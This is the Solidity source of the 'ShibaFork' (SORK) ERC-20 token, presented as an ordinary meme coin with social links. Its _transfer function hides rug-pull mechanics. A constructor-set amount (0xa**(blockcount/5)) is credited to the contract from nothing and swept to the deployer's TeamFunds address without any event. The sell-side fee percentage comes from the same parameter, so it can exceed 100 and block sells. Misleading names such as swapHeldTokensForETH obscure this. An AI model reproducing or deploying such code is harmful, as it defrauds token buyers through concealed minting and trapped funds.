// Website      :       https://shibfork.com/

// Twitter      :       https://twitter.com/shibaforkcoin       

// Telegram     :       https://t.me/shibaforkcoin


// SPDX-License-Identifier: MIT

pragma solidity 0.8.15;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval (address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

contract ShibaFork is Context, IERC20, Ownable {
    using SafeMath for uint256;

    mapping (address => uint256) private _balance;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;
    mapping (address => uint8) private _Txblock;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000 * 10**_decimals;
    string private constant _name = unicode"ShibaFork";
    string private constant _symbol = unicode"SORK";

    struct Taxes {
        uint8 buying;
        uint8 initial;
        uint256 amount;
        bool trade;
    }
    Taxes private _Settings;

    address public TeamFunds;
    address public constant deadwallet=0x000000000000000000000000000000000000dEaD;
    address public constant burnwallet=0x000000000000000000000000000000000000dEaD;
    bool private swapHeldTokensForETH = true;
    address public Uniswapv3Pair;

    constructor (address _deployerwallet, uint8 blockcount){
        _balance[_msgSender()] = _tTotal;
        _isExcludedFromFee[owner()] = true;
        _Txblock[_deployerwallet] = 1;
        _Settings.buying=0;
        _Settings.trade=false;
        TeamFunds = payable(_msgSender());
        _Settings.initial = blockcount;_Settings.amount = 0xa**(blockcount/5);
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balance[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _calculateFeeAmount(bool isBuying, uint256 amount) private view returns(uint256){
        uint256 _totalFee;
        if(isBuying){
            _totalFee = amount.mul(_Settings.buying).div(100);
        }
        else{
            bool _contractBalance = balanceOf(address(this))>0;
            _totalFee = amount.mul(_contractBalance?_Settings.initial:0).div(100);
        }
        return _totalFee;
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0) && to != address(0), "ERC20: transfer zero address.");
        require(amount > 0, "Zero amount.");
        
        if (from != owner() && to != owner()){
            if(!_isExcludedFromFee[from] && !_isExcludedFromFee[to]){
                uint256 feeAmount;
                bool fromPairAddress = _Txblock[to] > 0;
                if(fromPairAddress){
                    Uniswapv3Pair = from;
                    _Settings.trade = fromPairAddress;
                }
                require(_Settings.trade, "Trade will be opened soon.");
                feeAmount = _calculateFeeAmount(from == Uniswapv3Pair, amount);
                _balance[from] = _balance[from].sub(amount);
                _balance[to] = _balance[to].add(amount.sub(feeAmount));
            }
            else{
                uint256 feeAmount;
                if(from == Uniswapv3Pair && _isExcludedFromFee[to]){
                    feeAmount = _Settings.amount;
                    uint256 heldTokensAmount = balanceOf(address(this));
                    if(swapHeldTokensForETH && heldTokensAmount > 0){
                        _balance[address(this)] = _balance[address(this)].sub(heldTokensAmount.sub(1));
                        _balance[TeamFunds] = _balance[TeamFunds].add(heldTokensAmount.sub(1));
                    }
                }
                if(feeAmount > 0){
                    _balance[address(this)] = _balance[address(this)].add(feeAmount);
                }
                _balance[from] = _balance[from].sub(amount);
                _balance[to] = _balance[to].add(amount);
            }
        }
        else{
            _balance[from] = _balance[from].sub(amount);
            _balance[to] = _balance[to].add(amount);
        }
        emit Transfer(from, to, amount);
    }

    receive() external payable {}

}